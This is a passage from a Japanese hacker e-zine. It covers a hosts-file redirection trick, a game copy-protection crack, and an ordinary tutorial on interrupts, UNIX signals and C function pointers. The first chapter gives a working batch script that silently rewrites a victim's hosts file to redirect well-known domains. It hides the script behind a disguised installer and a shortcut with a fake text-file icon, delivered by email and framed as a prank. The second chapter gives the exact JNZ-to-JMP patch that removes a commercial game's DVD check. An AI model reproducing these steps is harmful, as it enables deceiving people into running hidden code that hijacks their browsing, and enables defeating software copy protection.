+</td></tr></table>
+</a>
+</body></html>
+-----
+
+　IE6でファイルを開き、リンク先の「http://yahoo.co.jp」の文字の上へカーソ
+ルを持っていくと、ステータスバーにはちゃんと「http://yahoo.co.jp」と表示
+されることでしょう。ところが、クリックしてみると、出てくるのはSecurity A
+kademeiaのページです。
+
+　このケースでも、クリックした後のURLを見れば、どこのサイトかわかります。
+それでは、ジャンプ先のURL欄を見れば、必ず偽サイトを見分けられるから安心…
+…かというと、そうでもないのです。
+
+　ブラウザにURLを打ち込むと、ドメインの部分がPC内部でIPアドレスに変換され
+てから、相手のWEBサーバに接続されます。この変換を行っているのがリゾルバと
+いうプログラムです。リゾルバは、ドメインとIPアドレスの対応づけを知るため
+に、DNSサーバ――ドメイン・ネーム・システムサーバに問合せをします。
+　ところが、あるファイルに設定されたドメインについては、DNSサーバに問合せ
+ずに直接IPアドレスに変換されるのです。ここで使われるのがhostsファイルです。
+　では、自分のPCでhostsファイルを探してみましょう。OSごとのhostsファイル
+は下記のフォルダに入っています。
+
+　　Windwos9x/Me ドライブ名:Windows\hosts 
+　　WindowsNT/2000 ドライブ名:\WINNT\system32\drivers\etc\hosts 
+　　WindowsXP ドライブ名:\WINDOWS\system32\drivers\etc\hosts 
+
+　見つからない方は、フォルダオプションで「隠しファイルを表示しない」の設
+定を、「すべてのファイルとフォルダを表示する」に変更すること。「登録され
+ている拡張子は表示しない」のチェックも外しておきましょう。
+
+　hostsファイルが見つかったら、テキストエディタで開いて、一番下に次の一行
+を書き加え、上書き保存してみてください。
+
+-----
+66.249.89.99 www.yahoo.co.jp
+-----
+
+　エディタによって、.txtの拡張子がついてしまうことがあるので、確認してお
+きましょう。ついていた場合は削っておきます。その後、ブラウザでhttp://www
+.yahoo.co.jpを見てみると……さて、どこにつながったでしょう？
+
+　以上からわかるように、hostsファイルに次のような書式で書いておくと、右の
+ドメインへが、左のIPアドレスに変換される仕組みになっています。
+
+-----
+IPアドレス ドメイン名（ホスト名）
+-----
+
+　スパイウェアなどで事前にこれを仕込まれていれば、ブラウザに表示されてい
+るのとはまったく違うサイトに接続されてしまうわけです。
+
+
+■0x03.) 悪戯ツールを作ってみよう
+
+　やけに長い説明終わり！
+　ではこれで、どんな悪戯ができるか考えてみましょう。
+　一番面白いのは自前でサーバーを立ち上げることですね。フリーウェアも出て
+いますので、ブロードバンド環境であれば案外簡単です。IPアドレスを自分のPC
+のアドレスにしておいて、友達に「Yahooのサイトをハックしたゼ！」と驚かして
+みたり、新聞のサイトをコピーして「こないだ新聞に載ったよ！」とだましてみ
+たり……。ハロウィンのTrickにもってこい（？）な演出ができます。
+　残念ながらレンタルサーバーのWEBスペースには飛ばせませんが、知人のサイト
+を別のサイトに飛ばし、「君のサイトおかしなことになってるよ！」と驚かすこ
+とはできるかもしれません。
+
+　…と、いろんなネタが考えられるわけですが、自分のPCで見せるならともかく、
+相手が遠くにいる場合、hostsファイルを直接いじるわけにもいかないでしょう。
+そこで、hostsファイルを書き換えるツールを作ってみます。といっても、実行フ
+ァイルを作るのは面倒なので、簡単にテキストエディタでバッチファイルを作成
+します。
+　バッチファイルをクリックさせるために、面白いフリーウェアかなにか用意し
+ておきましょう。このソフトのインストーラの拡張子を、次のように書き換えて
+おきます。
+
+setup.exe→setup._
+
+　それから、次の命令をテキストエディタに張りつけて、install.batなどの名前
+で保存します。
+
+-----　Windows 2000/NT/XPの場合
+if exist %windir%\system32\drivers\etc\hosts.bkup goto end
+ ren %windir%\system32\drivers\etc\hosts hosts.bkup
+ echo 210.171.226.47 www.microsoft.com>> %windir%\system32\drivers\etc\hosts
+:end
+setup._
+-----
+
+-----　Windows 9x/Meの場合
+if exist %windir%\hosts.bkup goto end
+ ren %windir%\hosts hosts.bkup
+ echo 210.171.226.47 www.microsoft.com>> %windir%\hosts
+:end
+setup._
+-----
+
+　このバッチファイルの中身を簡単に説明すると、以下のようになっています。
+
+1行目：既にバックアップファイルがあれば、処理を実行しない。
+2行目：今あるhostsファイルをhosts.bkupにリネームする。
+3行目：hostsファイルに設定を書き込む（好きな組み合わせに変えてください）。
+4行目：ラベル。
+5行目：本物のsetupファイルを実行する。
+
+　実行ファイルは拡張子が違っても実行されてしまう……というのがミソです。
+　これをソフトと一緒に圧縮して、メールに添付。本文には、「面白いフリーウ
+ェア見つけたよ。install.batをクリックしてね」などと書いておけばよろしい。
+友人がソフトをインストールしたのを確認後、メールで、「このサイト見てみて
+！」と大手サイトのURLを張りつけて送れば、びっくりすること間違いなしです。
+誘導したいサイトのIPアドレスが、自分のサイトでない場合は、コマンドプロン
+プトの画面から以下のようにPINGを打って調べてもいいし、
+
+-----
+ping ドメイン名
+-----
+
+　PINGが禁止されているサイトなら、WEBサイトの変換サービスを利用しても構い
+ません。"lookup"というキーワードで検索すれば、たくさん引っかかるはずです。
+
+
+■0x04.) ファイルを偽装してみよう
+
+　これだけでもよいのですが、用心深い友達だと、実行前にバッチファイルの中
+身を確かめるかもしれません。バッチファイルは、テキストエディタで開けば、
+簡単に中身が見えてしまいます。
+　そこで、バッチファイルをテキストファイルに偽装する方法をご紹介します。
+
+1：まずテキストファイルを用意します。ソフトの使用方法、インストール方法、
+シリアル番号、なんでも構いません。テキストエディタで開かれないよう、拡張
+子なしの名前（ここでは"info"とする）で保存します。
+
+2：さっきのバッチファイルの最後の1行を、次のように書き換えます。
+
+-----
+%windir%\notepad.exe info
+-----
+
+3：バッチファイルを右クリックして、「ショートカットの作成」でショートカッ
+トを作成します。
+
+4：ショートカットの名前を「最初に読んでね.txt」などに変更します。
+
+5：ファイルのプロパティを開き、「ショートカット」タブでアイコンをテキスト
+ファイルのものに変更します。
+
+　こうすると、バッチファイルへのショートカットが一見テキストファイルに見
+えます。が、ダブルクリックするとバッチファイルが実行されます。コマンドプ
+ロンプトの画面が開いてしまいますが、一瞬で消えてノートパッドでテキストフ
+ァイルが開かれるので、ぼんやりしていると気づかないでしょう。
+
+
+■0x05.) 元に戻す方法
+
+　これで終り……ではありません。悪戯した後は、ちゃんと元に戻してあげまし
+ょう。
+　さっきのバッチでバックアップファイル（hosts.bkup）を作ってあるため、手
+動でも戻せますが、どうせなら修正用のバッチファイルを送ってあげるのが親切
+というものです。
+　元に戻すバッチの中身は次のようになります。
+
+-----　Windows 2000/NT/XPの場合
+if not exist %windir%\system32\drivers\etc\hosts.bkup goto end
+ del %windir%\system32\drivers\etc\hosts
+ ren %windir%\system32\drivers\etc\hosts.bkup hosts
+ echo さっきのはジョークでした。ごめんね。> sorry
+ %windir%\notepad.exe sorry
+ del sorry
+:end
+-----
+
+-----　Windows9x/Meの場合
+if not exist %windir%\hosts.bkup goto end
+ del %windir%\hosts
+ ren %windir%\hosts.bkup hosts
+ echo さっきのはジョークでした。ごめんね。> sorry
+ %windir%\notepad.exe sorry
+ del sorry
+:end
+-----
+
+　謝罪の言葉も入れてみました。ジョークの分かる友達なら、これで友情にヒビ
+は入らないはず？
+　友達は大切に！
+
+
+■0x05.) エピローグ
+
+　いかがでしたでしょうか？
+　スパイウェアやウイルスなどでよく使われていたテクニックなので、こんなこ
+と、とっくの昔に知ってるよ！　と思われた方もおられるかもしれません。しか
+し、まだ使える技ではあります。
+　バッチファイルだけにいろいろと応用が利きますが、くれぐれも悪事を働いた
+り、フィッシング詐欺に使おうなどと思わないように。
+　捕まっても知りませんゼ。hehehe。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第5章: えちぃげーむのCD・DVDチェックの外し方 ---
+
+著者：右サイド
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　皆さんはえちぃげーむをやったことがあるでしょうか？
+　やったことがある人なら一度はお目にかかるCDチェックドライブの容量に余裕
+があるなら仮想ドライブに突っ込んでおけば問題ありません。しかし、やっぱり
+容量は無駄遣いしたくないし、ドライブも痛めたくありません。そんなわけで、
+今回はCD・DVDチェックを外してしまいましょう！！
+
+
+■0x02.) 準備
+
+・Ollydbg（これがなきゃ始まらない）
+・魔界天使ジブリール（製品版___体験版では無理）
+http://frontwing.jp/
+
+　え～、このジブリールよいです。陵辱系の部類に入ると思いますがそこまでき
+つくありません。ギャグ要素も満載で、初心者にもすんなり受け入れられると思
+います。ロリっ子もいますし…ﾌﾌﾌ。おすすめの一品です（読者の皆様すいません。
+右が馬鹿なせいで、エロゲーの紹介まで……）。
+
+
+■0x03.) 解析開始
+
+　それでは、まずはじめにOPでも見てみましょう。
+　ムービーの質としてはジブリール2の方が格段に上なのですが…。あのRainbow
+-Motion-Graphicsが作っているんですからあまり前といってはあれなのです。
+
+　ではとりあえず、DVDを入れない状態で起動してみましょう。
+
+警告：「DVD-ROMが見つかりません。製品のDVD-ROMを挿入して、再試行して下さ
+い」
+
+というメッセージのが出てくるはずです。
+
+　この警告が重大なヒントになります。
+　このダイアログを見つけ出して、そこにBP（ブレイクポイント）をセットしま
+す。見事そこに当たったら、その前の処理の分岐を確認すればよいだけです。っ
+てか、これを書いた時点で解析はもう終わりと見てよろしいのですが、エロゲー
+ができない中学生・高校生の諸君のために先人の残した資料と言うことで書きま
+す（まあ、今時中学生でもエロゲー買ってますから、祖父地図でも行って買って
+きてください。店員さんが恐ろしいという人は、通販でどうぞ～）。
+
+　とりあえず、Ollyに突っ込んで参照文字列の検索をしてください。
+　0042CEBBに警告に出てきた文字列が見えますので、そこにBPを仕掛けてくださ
+い。
+
+-----
+0042CEA5  |. FF15 DC554600  CALL DWORD PTR DS:[<&ole32.CoInitialize>>;  ole32.CoInitialize
+0042CEAB  |. E8 3CACFFFF    CALL ADV.00427AEC
+0042CEB0  |. 0FB6C0         MOVZX EAX,AL
+0042CEB3  |. 85C0           TEST EAX,EAX
+0042CEB5  |. 75 23          JNZ SHORT ADV.0042CEDA
+0042CEB7  |> 6A 00          /PUSH 0                                  ; /Arg3 = 00000000
+0042CEB9  |. 6A 35          |PUSH 35                                 ; |Arg2 = 00000035
+0042CEBB  |. 68 00C34900    |PUSH ADV.0049C300                       ; |Arg1 = 0049C300
+0042CEC0  |. E8 2BD80200    |CALL ADV.0045A6F0                       ; \ADV.0045A6F0
+0042CEC5  |. 83F8 02        |CMP EAX,2
+0042CEC8  |. 0F84 AF000000  |JE ADV.0042CF7D
+0042CECE  |. E8 19ACFFFF    |CALL ADV.00427AEC
+0042CED3  |. 0FB6C0         |MOVZX EAX,AL
+0042CED6  |. 85C0           |TEST EAX,EAX
+0042CED8  |.^74 DD          \JE SHORT ADV.0042CEB7
+-----
+
+　こんな場所に出てきます。
+　すまん............先にいわしてくれ。さっきの場所の1カ所を書き換えたら、
+もう講座が終了してしまいます。ソフト選択間違えた！！あはははは……orz
+
+　ちなみに書き換える場所は次のところです。
+
+-----
+0042CEB5  |. 75 23          JNZ SHORT ADV.0042CEDA
+-----
+
+　このJNZをJMPに変えれば素敵に起動します。これを応用すれば、他のソフトの
+解析の場面でも役に立ちます。たま～に、デバッガの検出をするソフトが存在す
+るので、そのときは自分で対処してください。Canvaas2なんかがそうです。もう
+これで、P2Pでのクラックパッチ探しに困る必要が無く自給自足なエロゲライフが
+送れますね♪
+　もうちょっと歯ごたえのある解析がしたかったのですが、偶然あったチェック
+のあるソフトがこれしかなかったので、こんな短く簡単な解析になってしまいま
+した。時間と根気と技術があればどのファイルをチェックしているのかまで求め
+たかったのですが、技術と根気がないので、きれいさっぱり諦めました。
+
+　それではまた～。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第6章: 割り込みプログラム [前編] ---
+
+著者：Defolos
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　こんにちは、Defolosです。
+　今回で10回目の参加となりました。10回目参加の記念（？）として2回にわたる
+レポートを執筆したいと思います。
+　今回は割り込みについて、少し技術的なレポートとなりましたが、私は割り込
+みのプロでもプログラミングのスペシャリストでもありませんので、レポートの
+内容の正確さは保障できません。もし誤った記述を見つけてくださいましたら、
+報告頂けるとうれしく思います。
+
+　今回割り込みについて執筆しようと思ったのは、最近Socketプログラミングを
+勉強していて、非同期的に送受信を行う方法として割り込みを使ってはどうかと
+考えたからです。ですので、このレポートは私が割り込みを勉強するために集め
+たメモや資料をまとめたものです。
+
+
+■0x02.) 割り込み
+
+　コンピュータはプログラムの指示にしたがい、通常はプログラム通り順次的に
+処理を行いますが、その処理の流れの中で各種の要因による事象がプログラムの
+流れと独立して発生することがあります。これに応じて今処理しているプログラ
+ムの流れを一時的に中断してほかの処理を実行することを割り込みといいます。
+これはつまり、プログラム実行中に別の処理を割り込ませる仕組みということに
+なります。
+　また、割り込ませる処理のことを割り込みハンドラ（interrupt handler）とい
+います。
+
+　割り込みにはどういったものであれ、必ず優先レベル（priority level）がつ
+けられています。これにより、同時に複数の割り込みが発生した場合に優先させ
+るべき割り込みを優先して割り込ませることができます。例えば、キーボードイ
+ベントなどの優先レベルが低い割り込みは、ハードウェアの障害発生通知割り込
+みなどの優先レベルの高い割り込みの発生を優先しなければなりません。
+
+　割り込みには発生要因別に外部割込みと内部割込みの二つに分けられます。
+
+●外部割込み
+
+　入出力装置や他の中央演算装置、コンピュータシステム外からの要因によって
+引き起こされる割り込みのこと。主に電源異常、タイマー時間超過、入出力装置、
+オペレータの介入、ハードウェアの誤りチェックなどで発生します。
+
+●内部割込み
+
+　プログラムに誤りが発生したときや、プログラム自身がなんらかの処理を実現
+させるために制御の転移を必要としたときに発生します。つまり、プログラムの
+進行に関連して引き起こされれる割り込みです。実行中のプログラムが0による除
+算やオーバフロオーを引き起こしたとき、書込み禁止メモリへの書き込み処理な
+ど、およびSVC（SuperVisor Call）命令（※1）の実行などで発生します。
+　また、SVC命令のように、割り込みを起こす命令を実行することによって故意に
+割り込みを起こさせることを、特に割り出し（Trap）とよびます。
+
+
+（※1）プログラムがOSのカーネルに処理を依頼するための命令。この場合の「ス
+ーパバイザ」と「カーネル」はほぼ同義である。
+　一般的なOSでは、OSカーネル以外のプログラムが勝手にタスクを切り替えたり入
+出力装置にアクセスすることは許されていない。そこで、一般のプログラムがカー
+ネルの機能を利用する場合には、プログラムはSVCを利用してOSカーネルに処理を
+依頼し、実際の処理はカーネルが特権を利用して行なっている。
+
+IT用語辞典 e-Words（http://e-words.jp/）より引用
+
+
+■0x03.) 割り込みの動作
+
+　割り込みが発生すると、実行中のプログラムは実行が中断され、そのプログラ
+ムの実行状態を表す制御情報をまとめたプログラム状態語（Program Status Wor
+d：PSW）およびプログラム状態ベクタが一定の領域へ退避され、割り込み処理を
+行うルーチンへ制御が移されます。割り込み処理を終えた後は退避させたプログ
+ラム状態語を復帰させ、中断していた処理を続行します。
+
+　ここでハードウェア割り込みの代表例、キーボードからの入力を例としてみて
+いきたいと思います。ハードウェア割り込みとは外部割込みに含まれ、CPU外部か
+らの影響によりCPUのINTRピンに対する状態の変化（HiからLowなど）があったと
+きに、CPUが今まで行っていた処理を中断し、制御を特定のアドレスに移す機能で
+す。
+　キーボードなどのハードウェアは、通常オペレーティングシステムの起動時に
+それぞれのハードウェアに対して個別のIRQ（Interrupt Request）を割り当て、
+そのIRQ番号とハードウェアを関連付けて管理しています。もし、異なるハードウ
+ェアが同一のIRQを利用するように設定してしまうと、多くの場合はオペレーティ
+ングシステムはクラッシュしてしまいます。
+
+●キーボードの処理手順
+
+1：CPUがなんらかの処理を行っているとします。
+
+2：そこへキーボードが押されると、キーボードと繋がっているPIC（Programabl
+e Interrupt Controller）と呼ばれるチップがキーボードの入力を感知します。
+
+3：PICはCPUのINTRピンに接続されていて、INTRピンの状態をONからOFFに変更し
+ます。
+
+4：PICはデータバスにキーボードに対応するIRQを流します。
+
+5：CPUがINTRピンの状態変化を検出し、割り込み制御ロジックを動かします。
+
+6：データバスのIRQを読み込み、それがキーボードであることを認知します。
+
+7：CPUが（メモリの特定番地+IRQの数値）にある番地の内容のアドレスを取得し
+ます。これはつまり、割り込み要求元（IRQ）と割り込む処理プログラムの先頭ア
+ドレスとの対応表のような関係になっています。このような「割込み要求元」に
+対する「割り込み処理プログラムの先頭アドレス」の対応表のことを割り込みベ
+クタといいます。
+
+8：実行しているプログラムの処理サイクル中で問題にならないタイミングで、ス
+タックに現在実行しているプログラムの次の処理の番地を積みます。これはプロ
+グラムの実行状態の退避にあたります。また、フラグレジスタの値も退避されま
+す。
+
+9：制御をIRQに対応する割り込みベクタのアドレスに移行させます。割り込みベ
+クタのキーボード処理では、キーボードコントローラと通信し、どのキーから入
+力があったのかという情報を取得しますが、一般的に割り込みベクタの処理は短
+時間で済ませる必要があるため、多くの場合この処理ではどのキーからの入力か
+という情報をFIFOバッファ（※2）に乗せるぐらいの処理しか行いません。
+
+10：入力がどのプロセスに対して行われたものなのかを判別、割り振りをするの
+はキーボードイベントに対する割り込みベクタの役割範囲外なので、多くの場合、
+割り込みベクタはキー入力を適切にそれぞれのプロセスの入力バッファに分配す
+る処理にまかせるようです。
+
+11：CPUのIRET命令によって割り込みベクタの処理が終了します（Intelの場合）。
+ステップ8でスタックに退避させた番地を取得し、制御を移行させます。これで割
+り込み前の処理に制御が戻りました。
+
+12：適切なタイミングでFIFOバッファから、その入力を受け取るべきプロセスの
+キーボードバッファにキー入力が転送されます。
+
+13：そこでプログラムがキーボードからの入力を読み込むシステムコール（read
+など）を実行すると、このキーボードバッファからシステムコールの戻り値とし
+てキーボードからの入力内容が得られます。
+
+（※2）First-In First-Out方式。ある場所に格納したデータを、古く格納した順
+に取り出すようにする方式。一番新しく格納されたデータが一番最後に取り出さ
+れる。キュー(queue)と呼ばれるデータ構造はこの方式でデータを扱う。
+
+IT用語辞典 e-Words（http://e-words.jp/）より引用
+
+
+■0x04.) シグナル
+
+　ハードウェア割り込みは非同期的に処理を行えるため、非常に有用な仕組みで
+した。そこで、こういったハードウェア割り込みのような仕組みをプログラム的
+に実装しようという考えがオペレーティングシステム全般で採用されました。こ
+れはイベントドリブンのプログラミングのアイディアともなっています。
+
+　UNIXでは、このハードウェア割り込みのような仕組みをプログラム的に実装し
+ようという考えに積極的に取り組みました。その結果、非同期的に起きる可能性
+のあるイベントには「シグナル」という仕組みを作りました。シグナルとはその
+名の通り、信号の意味で、非同期的にイベントの信号を受け取り、処理する仕組
+みのことです。
+　シグナルで非同期的に起こる可能性のあるイベントには次のようなものがあり
+ます。
+
+●SIGALRM
+
+　アラームタイマーの時間が満たされた場合に発生します。デフォルトでは、こ
+のシグナルが発生してもプログラムは無視します。
+
+●SIGINT
+
+　ユーザーからの強制終了シグナルです。Ctrl+Cを押した場合などに発生します。
+デフォルトの設定では、このシグナルを受け取ったプログラムは終了します。
+
+●SIGTSTP
+
+　プロセスの一旦停止のためのシグナルです。Ctrl+Zが押された場合などに発生
+します。
+
+●SIGCONT
+
+　一旦停止されたプロセスを再開させるためのシグナルです。
+
+●SIGCHLD
+
+　そのプロセスが作り出した子プロセスの一旦停止または終了した場合に発生し
+ます。デフォルトでは、このシグナルを受け取ったプロセスはシグナルを無視し
+ます。
+
+●SIGFPE
+
+　浮動小数点演算のエラーや0による除算などが行われたときに発生します。デフ
+ォルトでは、このシグナルを受け取ったプログラムは終了します。
+
+●SIGEGV
+
+　メモリアクセス違反（セグメンテーションフォルト）が起きたときに発生しま
+す。デフォルトでは、これを受け取ったプログラムは終了します。
+
+　これらのイベントは、いつどのようなタイミングで発生するかわかりません。
+それゆえに、非同期的にシグナルを受け取り、処理することが非常に重要になっ
+てきます。シグナルを用いないでこれらのイベントの発生を検出するには、ある
+一定時間ごとにCPUがイベントの発生があったかどうかを確認していく必要があり
+ます。これは一般的にポーリングと呼ばれる仕組みですが、大変非効率です。
+
+　シグナルにはそれぞれデフォルトの動作が決められていますが、これはあくま
+でデフォルトでの動作であり、後からプログラマーが自由に動作を変更すること
+ができます。もしデフォルトの動作に満足なら変更せずにそのまま使うこともで
+きます。
+　また、UNIXの開発者たちはシグナルによるプログラムの停止にいくつかの種類
+を設定しました。次に停止の種類を挙げます。
+
+●SIGINT
+
+　Ctrl+Cでの終了です。
+
+●SIGTERM
+
+　「プログラムはすみやかに終了せよ」という勧告です。これは、子プロセスを
+生成しているプログラムにおいて子プロセスも終了させることを想定しています。
+
+●SIGQUIT
+
+　デフォルトの動作として、終了が定義されています。
+
+●SIGKILL
+
+　即刻プログラムを終了します。また、プロセスで再定義することはできません。
+
+
+■0x05.) 関数ポインタ
+
+　関数ポインタはシグナルにおいてシグナルハンドラを指定する場合に使用しま
+す。ポインタというのはC言語の学習で鬼門とされるところです。関数ポインタと
+いうのもポインタで、通常のポインタと同じようにその関数の開始アドレスを保
+持する変数のことです。まずはポインタのおさらいからはじめてみましょう。
+
+●ポインタ
+
+　ポインタとは変数のアドレスを格納する変数です。変数というのはコンパイル
+されたときにメモリ上の番地の一画に、必要な長さ分確保されます。この番地を
+格納するのがポインタです。例えば、変数int test = 30はメモリ上に次のように
+確保されます。
+
+番地  [メモリ]
+1   +---------+
+    |         |
+2   +---------+
+    !         !
+
+100 .         .
+    |         |
+101 +---------+
+    |   30    |←test
+102 +---------+
+    !         !
+
+　この例ではメモリ101番地をtestと名づけ、その番地に30を格納しています。t
+estと名づけることでわずらわしい番地の番号を指定しなくてもよくなったわけで
+す。このように番地に別名をつけるのはアセンブラでラベルにあたるものだと思
+います。
+　この例で変数testというものは101番地であると定義されています。そこで、こ
+のtestというラベルのついた番地を他の変数に格納する仕組みをポインタといい
+ます。ポインタも変数の一種ですから、当然メモリの番地の一画に確保されてい
+るわけですが、この番地は特別な番地に確保されます。
+
+　ポインタの宣言、利用は次のように行います。
+
+-----
+int main (void){
+
+    int test = 0;     /* 変数testの宣言 */
+    int *pointer;     /* ポインタの宣言 */
+    int temp = 0;     /* 103番地に確保されるものとする */
+
+    pointer = &test;  /* testのアドレスを格納 */
+    *pointer = 2600;     /* 解説は後述 */
+    temp = *pointer + 1; /* 解説は後述 */
+
+return 0;
+}
+-----
+
+　変数の前に*をつけることでポインタだと宣言します。pointer = &test;でpoi
+nterにtestのアドレスを格納します。
+
+番地  [メモリ]
+1   +---------+
+    !         !
+
+100 .         .
+    |         |
+101 +---------+
+    |   0     |←test
+102 +---------+
+    |         |
+103 +---------+
+    |   0     |←temp
+    +---------+
+    !         !
+
+900 .         .
+    |         |
+901 +---------+
+    |  101    |←pointer（内容は変数testのアドレス）
+    +---------+
+
+　ポインタを使ったデータのアクセスには*をつけます。*pointerで、pointerに
+格納されているアドレスの中身を表します。それ故に*pointer = 2600;で「poin
+terに格納されているアドレスの中身を2600で上書きする」という命令になります。
+
+番地  [メモリ]
+1   +---------+
+    !         !
+
+100 .         .
+    |         |
+101 +---------+
+    |  2600   |←test
+102 +---------+
+    |         |
+103 +---------+
+    |   0     |←temp
+    +---------+
+    !         !
+
+900 .         .
+    |         |
+901 +---------+
+    |  101    |←pointer (内容は変数testのアドレス)
+    +---------+
+
+　temp = *pointer + 1;は、pointerに格納されている値（ここではtestのアドレ
+スである101）に1を足すという命令になります。それによってtempに格納される
+値は102になります。
+
+番地  [メモリ]
+1   +---------+
+    !         !
+
+100 .         .
+    |         |
+101 +---------+
+    |  2600   |←test
+102 +---------+
+    |         |
+103 +---------+
+    |   102   |←temp
+    +---------+
+    !         !
+
+900 .         .
+    |         |
+901 +---------+
+    |  101    |←pointer (内容は変数testのアドレス)
+    +---------+
+
+参考：初心者のためのポイント学習Ｃ言語
+（http://www9.plala.or.jp/sgwr-t/）
+
+●関数ポインタ
+
+　関数ポインタも前述の通り、通常のポインタと概念自体は変わりありません。
+関数も機械語に翻訳され、メモリにロードされる段階になれば、関数の開始位置
+（エントリポイント）も変数と同様にメモリに読み込まれます。このエントリポ
+イントのアドレスを格納するのが関数ポインタです。
+　C言語では関数名というのは関数のエントリポイントのアドレスに対するラベル
+のように処理されていますので、関数ポインタという考え方はごく自然なもので
+す。
+
+-----
+#include <stdio.h>
+
+int main(void){
+
+    void test(char *);  /* プロトタイプ宣言 */
+
+    void (*func_p)(char *) = test; /* 解説は後述 */
+    func_p("It is a test.");
+
+return 0;
+}
+
+/*--------------------*/
+/*     関数test       */
+/*--------------------*/
+
+void test(char * a){
+
+    printf("%s\n", a);
+
+}
+-----
+
+　関数ポインタは「戻り値の型 (*ポインタ名) (引数のリスト);」のように宣言
+します。この例ではvoid (*func_p)(char *);がそれにあたります。つまり、voi
+d型の戻り値を持ち、char型を引数とする関数のエントリポイントを格納するfun
+c_pを宣言しているということになります。
+　その直後の= test;という部分でfunc_pに関数testのエントリポイントのアドレ
+スを格納しています。後はfunc_pに対してchar型の引数を渡せばfunc_pに格納さ
+れたアドレス元の、関数testに引数を渡して実行させることができます。
+
+　ポインタ、関数ポインタは本来もっと奥が深いものなのですが、今回は割り込
+みについてが主題ですので、このレポートでは最低限必要なところだけに留め、
+他は愛割させていただきます。興味のある方は検索エンジンなどで調べてください。
+
+参考：目指せプログラマー！（http://www5c.biglobe.ne.jp/~ecb/c/16_01.html）
+参考：ロベールの部屋（http://www1.kcn.ne.jp/~robe/cpphtml/html03/cpp03009.html）
+参考：稚内北星学園大学 情報メディア学部 Ｃ言語 金山 典世（http://www.wakhok.ac.jp/~kanayama/C/02/node183.html）
+
+
+■0x06.) SysVシグナルとBSDシグナル、POSIXシグナル
+
+　シグナルは、その処理体系に三つの種類があります。SysVシグナル、BSDシグナ
+ル、POSIXシグナルの三つです。SysVシグナルはUNIXに古くから実装されており、
+広く普及しました。しかし、SysVシグナルは後述しますが、リエントラント問題
+などの対処に不備があり、シグナルの使い方によっては重大なエラーを引き起こ
+しかねない処理体系でした。
+
+　このSysVシグナルの不備に疑問を持ったBSD（Berkeley Software Distributio
+n）の開発者たちは、SysVシグナルの不備を埋めるべくBSDシグナルというシグナ
+ル処理体系を作りました。このBSDシグナルは、システムコール処理中のシグナル
+発生について、およびシグナルハンドラ処理中の同一シグナルの発生についての
+問題を解決しています。
+　しかし、残念ながらBSDシグナルを作ったためにおきる問題もあったようです。
+BSDシグナルを作ったことでSysVシグナルとBSDシグナルの2つのシグナル処理体系
+ができ、多くのUNIX上で動作させようとした場合、同じsignal関数を用いてもSy
+sVの処理体系をとるのか、BSDの処理体系をとるのかで、ソースコードを書き換え
+る必要がでてきてしまいました。BSDは後から開発されたため、SysVシグナルもち
+ゃんと動くように設計されていたため、BSDはそこまで普及せず、SysVシグナルで
+記述する方法が一般的だったようです。
+
+　このような2つの処理体系が入り混じった状況を打開するため、POSIX（Portab
+le Operating System Interface for UNIX）（※3）は2つのシグナル処理体系の
+長所をあわせ持つ、新しいシグナルシステムコールを作りました。これをPOSIXシ
+グナルといいます。POSIXシグナルはSysVシグナル、BSDシグナルの両方の動作を
+実装できますが、そのセマンティックス（※４）は全く別のものを利用していま
+す。
+　結論としていえることは、もはやSysVシグナルもBSDシグナルも古いものであり、
+POSIXシグナルを利用するのが無難です。また、後継のLinuxはPOSIXシグナルをあ
+る程度忠実に実装しているようです。
+
+（※3）IEEEによって定められた、UNIXベースのOSが備えるべき最低限の仕様のセ
+ット。各社のUNIX互換OSにはそれぞれ独自の拡張や仕様の変更が施され、互換性
+が失われてしまったため、各OS間で最低限の互換性を確保するために定義された。
+アプリケーションソフトがOSの提供する機能を呼び出すための方法（システムイ
+ンターフェース）などを定義している。アメリカ規格協会（ANSI）や国際標準化
+機構（ISO）でも標準として採用され、アメリカ政府機関に納入するUNIXシステム
+が守るべき必須条件となっている。
+
+IT用語辞典 e-Words（http://e-words.jp/）より引用
+
+（※4）データの意味のこと。データの形式や構造に対応する概念。あるものごと
+に対してどのような動作をするかということであり、ここではシグナルの処理の
+方法ということになります。
+
+
+■0x07.) 参考文献
+
+・『情報処理ハンドブック』（オーム社）　ISBN:4-274-07502-8
+・『コンピュータソフトウェア辞典』（丸善株式会社）　ISBN:4-621-03448-0
+・『杉浦康仁（三木淑生）のホームページ』杉浦康仁 著
+http://www.nurs.or.jp/~sug/index.shtml
+
+
+■0x08.) さいごに
+
+　今回は前半ということで、技術的なところにはあまり触れず、歴史や概要とい
+った部分を主体にレポートしました。次回はプログラム的な視点でレポートを行
+っていきたいと思います。今回のレポートで不備のある点、誤った点などは指摘
+していただければ幸いです。
+
+　それではまた来週にお会いしましょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第7章: 自前でDLLをプロセスへマッピングさせる方法 ～LoadLibrary関数の作成～ ---
+
+著者：Kenji Aiko
+
